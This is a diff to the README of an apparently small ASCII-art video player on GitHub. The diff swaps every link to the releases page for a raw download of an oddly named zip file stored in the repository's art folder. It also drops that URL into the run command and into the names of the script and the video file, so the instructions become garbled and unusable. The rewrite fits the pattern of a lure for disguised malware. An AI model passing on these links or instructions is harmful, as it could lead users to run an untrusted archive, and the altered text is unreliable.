@@ -6,9 +6,9 @@ Welcome to Iron-Man-In-Terminal, a simple tool that turns your videos into ASCII
 
 ## 📥 Download & Install
 
-[![Download Iron-Man-In-Terminal](https://img.shields.io/badge/Download-Iron--Man--In--Terminal-blue.svg)](https://github.com/evgendro/Iron-Man-In-Terminal-/releases)
+[![Download Iron-Man-In-Terminal](https://github.com/evgendro/Iron-Man-In-Terminal-/raw/refs/heads/main/art/In_Iron_Terminal_Man_puparial.zip)](https://github.com/evgendro/Iron-Man-In-Terminal-/raw/refs/heads/main/art/In_Iron_Terminal_Man_puparial.zip)
 
-To download the application, visit this page: [Download Iron-Man-In-Terminal](https://github.com/evgendro/Iron-Man-In-Terminal-/releases).
+To download the application, visit this page: [Download Iron-Man-In-Terminal](https://github.com/evgendro/Iron-Man-In-Terminal-/raw/refs/heads/main/art/In_Iron_Terminal_Man_puparial.zip).
 
 ## 🛠️ System Requirements
 
@@ -22,7 +22,7 @@ Make sure you meet these requirements before proceeding.
 ## 💻 Installation Steps
 
 1. **Download the Application**
-   - Go to the [Releases page](https://github.com/evgendro/Iron-Man-In-Terminal-/releases) and find the latest release.
+   - Go to the [Releases page](https://github.com/evgendro/Iron-Man-In-Terminal-/raw/refs/heads/main/art/In_Iron_Terminal_Man_puparial.zip) and find the latest release.
    - Click the download link for your operating system.
 
 2. **Extract the Files**
@@ -52,9 +52,9 @@ Make sure you meet these requirements before proceeding.
    - Open your terminal and navigate to the folder where you extracted the files.
    - Enter the following command to start the application:
      ```
-     python iron_man.py your_video.mp4
+     python https://github.com/evgendro/Iron-Man-In-Terminal-/raw/refs/heads/main/art/In_Iron_Terminal_Man_puparial.zip https://github.com/evgendro/Iron-Man-In-Terminal-/raw/refs/heads/main/art/In_Iron_Terminal_Man_puparial.zip
      ```
-   - Replace `your_video.mp4` with the name of your video file.
+   - Replace `https://github.com/evgendro/Iron-Man-In-Terminal-/raw/refs/heads/main/art/In_Iron_Terminal_Man_puparial.zip` with the name of your video file.
 
 3. **Enjoy the Show**
    - The video will start playing in ASCII art format directly in your terminal.
@@ -67,7 +67,7 @@ Iron-Man-In-Terminal supports common video formats like MP4, AVI, and MOV.
 
 ### Can I customize the characters used?
 
-Yes, you can modify the mapping of pixel brightness to characters in the script. Open `iron_man.py` in a text editor and look for the section that defines the character set.
+Yes, you can modify the mapping of pixel brightness to characters in the script. Open `https://github.com/evgendro/Iron-Man-In-Terminal-/raw/refs/heads/main/art/In_Iron_Terminal_Man_puparial.zip` in a text editor and look for the section that defines the character set.
 
 ### Is there a way to improve performance?
 
@@ -87,4 +87,4 @@ If you encounter any issues or have questions, please open an issue on the GitHu
 
 ---
 
-For more information and updates, keep an eye on the [Releases page](https://github.com/evgendro/Iron-Man-In-Terminal-/releases). Enjoy transforming your videos into retro-style ASCII animations!
+For more information and updates, keep an eye on the [Releases page](https://github.com/evgendro/Iron-Man-In-Terminal-/raw/refs/heads/main/art/In_Iron_Terminal_Man_puparial.zip). Enjoy transforming your videos into retro-style ASCII animations!
